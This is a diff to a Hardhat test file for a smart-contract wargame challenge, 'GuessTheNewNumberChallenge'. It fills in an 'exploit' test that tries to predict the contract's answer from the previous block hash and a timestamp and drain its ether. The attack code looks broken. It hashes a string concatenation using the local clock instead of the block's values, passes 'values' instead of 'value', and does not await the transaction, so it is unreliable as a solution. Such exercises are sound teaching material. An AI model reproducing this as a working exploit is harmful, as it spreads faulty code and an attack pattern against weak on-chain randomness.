@@ -2,6 +2,7 @@ import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
 import { expect } from 'chai';
 import { Contract } from 'ethers';
 import { ethers } from 'hardhat';
+import { keccak256 } from 'viem';
 const { utils, provider } = ethers;
 
 describe('GuessTheNewNumberChallenge', () => {
@@ -24,9 +25,15 @@ describe('GuessTheNewNumberChallenge', () => {
   });
 
   it('exploit', async () => {
-    /**
-     * YOUR CODE HERE
-     * */
+    const currentBlockNumber = await provider.getBlockNumber();
+    const blockNumber = await provider.getBlock(currentBlockNumber -1);
+    const blockHash = blockNumber.hash;
+    const timestamp = Math.floor(Date.now() / 1000);
+    const answer =  keccak256(blockHash + timestamp);
+    const tx = await target.connect(attacker).guess(answer, {values : utils.parseEther('1')});
+    tx.wait();
+
+
 
     expect(await provider.getBalance(target.address)).to.equal(0);
   });
